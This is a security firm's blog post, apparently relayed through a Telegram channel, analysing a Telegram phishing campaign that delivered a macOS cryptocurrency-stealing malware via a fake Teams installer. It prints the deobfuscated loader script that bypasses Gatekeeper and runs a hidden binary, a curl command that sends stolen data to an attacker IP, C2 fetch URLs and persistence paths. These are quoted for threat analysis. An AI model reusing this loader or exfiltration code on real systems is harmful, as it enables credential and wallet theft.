# 🛡️ A sophisticated Web3 phishing scheme exposed via Telegram

- **Source URL:** https://blog.asymmetric.re/threat-contained-behind-the-scenes-of-a-blocked-phishing-attempt
- **Fetched from:** https://asymmetric.com/blog/threat-contained-behind-the-scenes-of-a-blocked-phishing-attempt/
- **Fetched:** 2026-11-17
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/210 (id 210)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
[← All posts](https://asymmetric.com/blog/)

# Behind the Scenes of a Blocked Phishing Attempt

By John Bottoms

An attacker posing as a well-known web3 founder messaged one of our engineers via Telegram. Rather than ignoring the attempt, we isolated and analyzed the payload in a controlled environment, turning a live phishing attempt into a learning opportunity. This post provides a technical breakdown of the attack, execution flow, and key lessons for security teams operating in crypto and high-value environments.

## **Social Engineering & Setup**

The attacker initiated contact by impersonating a credible founder in the web3 space. The first few messages blended flattery with light technical discussion, mirroring how real vendor outreach often occurs in web3.

As the conversation progressed, the attacker proposed a live demo under the guise of a beta test for a new hardware wallet he was building. Rather than a generic phishing email, this was a tailored approach designed to exploit the potential victim's technical interests and leverage the reputation of the individual impersonated by the scammer.

The attacker deliberately leveraged common human tendencies and dynamics common in the web3 ecosystem. While security teams are generally cautious and skeptical, the community-driven nature of web3 often encourages open dialogue, peer support, and early feedback on new tools, particularly when requests come from respected figures within the community. The interaction flow mirrored real software testing scenarios, including natural friction points that made the request feel plausible.

Key elements that made this approach convincing:

- Leveraged Telegram, a common communication channel in the space
- Created a believable product scenario tied to the potential victim's expertise
- Used authentic dialogue with technical banter to build trust

## **Execution Flow: Payload Deployment**

We detonated the payload inside a segmented, instrumented macOS endpoint. Our environment included endpoint detection (EDR), a fully-patched version of macOS, and isolated networking routed over a VPN to observe execution . Here’s how it worked:

**Step 1:** The potential victim receives a phishing URL:

`https://microsoft[.]teams-invite[.]us/dl/launcher?deeplinkId=lto1nrlv-ena0-v3d5-p3jg-inridunvw7is&type=meet&suppressPrompt=true`

This leads to a spoofed Microsoft Teams page with valid TLS certs. Selecting "Continue in this browser" triggers an error, encouraging the user to download a Teams client manually.

**Step 2:** The user downloads a malicious DMG file:

- `Filename: MicrosoftTeams.dmg`
- `SHA256: 7dc4ef36f8ccded9dcde08afff00dcf55a4854a1c54fd57eec8d44a1e2caa952`

Download URL: `https://nmcrlab[.]com/4f014e59f43d39c6temp/bf6988c227188241/load[.]b55e302139310f1da2778841c81d[.]php?call=teamsd`

**Step 3:** Opening the DMG triggers an unusual request: the user is instructed to drag and drop an app icon into Terminal. This interaction circumvents Gatekeeper protections by exploiting user-initiated execution.

**Step 4:** The binary inside `MicrosoftTeams.RVQ` is not a legitimate application but an obfuscated shellcode using an uncommon `RVQ` extension. A hidden file (`.MicrosoftTeams`) is also embedded in the DMG.

- `MicrosoftTeams.RVQ` SHA256: `2030c58b75faaca0320433b593ab3752c34f4bd0bc3076d4f812c2a0ad264e8`
- `MicrosoftTeams` SHA256: `eb5f861562a7181a594f468a29b330dd8ff508e9223f93e01a6acb3c2cb4c6d1`

The initial payload was an obfuscated shellcode delivered as a binary with an uncommon `RVQ` extension. While `RVQ` is sometimes seen in machine learning contexts, its use here was likely intended to avoid common detection signatures. The combination of obfuscation and unusual file extension demonstrates deliberate efforts to evade both automated analysis and endpoint defenses.

**Step 5:** Initial execution is blocked by macOS 15.4.1, but we bypassed this prompt to continue the execution flow…

## **Privilege Escalation & Persistence**

The malware prompted for the system password using fake "System Preferences" dialogs.

Once credentials were captured, the malware requested full disk access via legitimate macOS TCC prompts.

The malware then installed persistence via multiple mechanisms:

- User-level Launch Item: `/Users/{user}/.config/installer-helper/InstallerHelper.app/Contents/MacOS/InstallerHelper`
- Root-level LaunchDaemon: `/Library/LaunchDaemons/com.finder.helper.plist`
- The `.agent` script loop ensured continuous execution under the user context

## **Payload Behavior: Data Collection and Exfiltration**

The initial payload, including several of the subsequent payload stages, was detected by EDR, which was intentionally running in detection-only mode on this machine to allow the malware to execute unimpeded.

**Stage 1:** The initial stage focused on preparing the malware for execution by locating, copying, and activating the embedded payload while evading macOS protections.

- Enumerated mounted disks and volumes to locate the payload
- Copied the hidden MicrosoftTeams binary to /tmp
- Removed extended metadata to bypass Gatekeeper checks
- Applied executable permissions and launched the binary

**The payload details (deobfuscated version) for MicrosoftTeams.RVQ:**

```
#!/bin/bash
osascript -e 'on run
    try
        set diskList to list disks
    end try
    set targetDisk to ""
    try
        repeat with disk in diskList
            if disk contains "MicrosoftTeams" then
                set targetDisk to disk
                exit repeat
            %nd if
        end repeat
    end try
    if targetDisk is "" then
        return
    end if
    set folderPath to "/Volumes/" & targetDisk & "/"
    set appName to ".MicrosoftTeams"
    set appPath to folderPath & appName
    set tempAppPath to "/tmp/" & appName
    try
        do shell script "rm -f " & quoted form of tempAppPath
    end try
    try
        do shell script "cp " & quoted form of appPath & " " & quoted form of tempAppPath
    end try
    try
        do shell script "xattr -c " & quoted form of tempAppPath
    end try
    try
        do shell script "chmod +x " & quoted form of tempAppPath
    end try
    try
        do shell script quoted form of tempAppPath
    end try
end run'
```
A full copy of the deobfuscated payload is available here: [link](https://github.com/asymmetric-research/malware-research/blob/main/Blog-Phishing-Attempt-2025-7/payload1-obfuscated.md)

**Stage 2: Data Collection and Exfiltration**

Once execution was established, the malware shifted to an objective of harvesting sensitive data from the infected system.

- Gathered information about the execution environment to ensure it was not being run in a virtual machine
- Spawned hidden Terminal sessions
- Harvested browser data (Chrome, Firefox, Brave, Edge, Vivaldi, Waterfox, Pale Moon), including cookies, login databases, IndexedDB extensions
- Collected cryptocurrency wallet data from Ledger Live, Electrum, Coinomi, Exodus, Wasabi, Bitcoin Core, Monero, Trezor, and others
- Extracted Apple Notes and associated SQLite attachments
- Stole credentials from password vaults: Bitwarden, KeePass, EnPass, LastPass, Norton, Avira, Compass, etc
- Extracted personal documents and files, applying size restrictions to evade detection

A full copy of the deobfuscated payload is available here: [link](https://github.com/asymmetric-research/malware-research/blob/main/Blog-Phishing-Attempt-2025-7/payload2.md)

### **Extraction Flow**

Files compressed via:

```
ditto -c -k --sequesterRsrc $writemind /tmp/out.zip
```
And exfiltrated via HTTP POST to the attacker infrastructure:

```
curl -X POST \
  -H "user: $login" \
  -H "BuildID: $buildid" \
  -H "cl: $cl" \
  -H "cn: $cn" \
  -F "file=@/tmp/out.zip" \
http://45[.]94[.]47[.]167/contact
```
### **Command & Control Infrastructure**

- Secondary payload fetch: `http://77[.]73[.]129[.]18:80/install.sh`
- Initial callback: `https://isnimitz[.]com/zxc/app`

The agent included VM detection logic, persistent callbacks, credential dumps, and periodic reinfection mechanisms designed for long-term access.

**Additional Stages:**

Following initial infection, many payload components were designed to persist and re-execute upon system reboot. During our extended analysis window, additional payloads activated several days after initial detonation, indicating staged delivery and delayed execution tactics.

### **Persistence & Command & Control**

The malware deployed multiple persistence mechanisms to maintain long-term access:

- Installed a root-level LaunchDaemon at `/Library/LaunchDaemons/com.finder.helper.plist.`
- Deployed a persistent .agent script loop that continuously monitored the active console user and relaunched the `.helper` backdoor under the correct user context.
- The helper agent regularly phoned home to attacker-controlled infrastructure (`isnimitz[.]com/zxc/app`) to receive further commands or drop additional payloads.
- A final stage fetch retrieved additional malware components from `http://77[.]73[.]129[.]18:80/install.sh.`

The agent maintained long-term access through persistent callbacks, credential harvesting, periodic reinfection, and even tampering with legitimate wallet applications, such as Ledger Live, to intercept private keys.

## **Impact Analysis**

Had this attack succeeded against an unpatched user, the impact would have included:

- Full credential and wallet compromise
- Theft of sensitive personal files, notes, and photos
- Long-term backdoor persistence
- Potential organizational lateral movement

## **What We Learned**

- Social engineering continues to shift toward platforms like Telegram
- Default macOS controls held up under initial execution, but must be enabled, and their warnings taken seriously to be effective
- Properly configured modern EDR performed very well, detecting this type of attack and continually flagged additional payloads at execution
- Multi-stage payload design demonstrates that the attacker was targeting crypto environments
- Downloading standalone conference clients remains a risk; browser-based clients are safer

## **Staying Ahead of the Curve**

This encounter illustrates how threat actors continue to refine their craft. Each incident provides an opportunity to refine defensive assumptions, gain a deeper understanding of attacker TTPs, and operationalize these learnings directly into client defenses.

The organizations that stay resilient are those that continuously test assumptions and approach security as an evolving discipline.

Unfortunately, these threats are only going to get more sophisticated. If your organization isn’t already building this capability, [our team can help you get there](https://asymmetric.com/contact/).
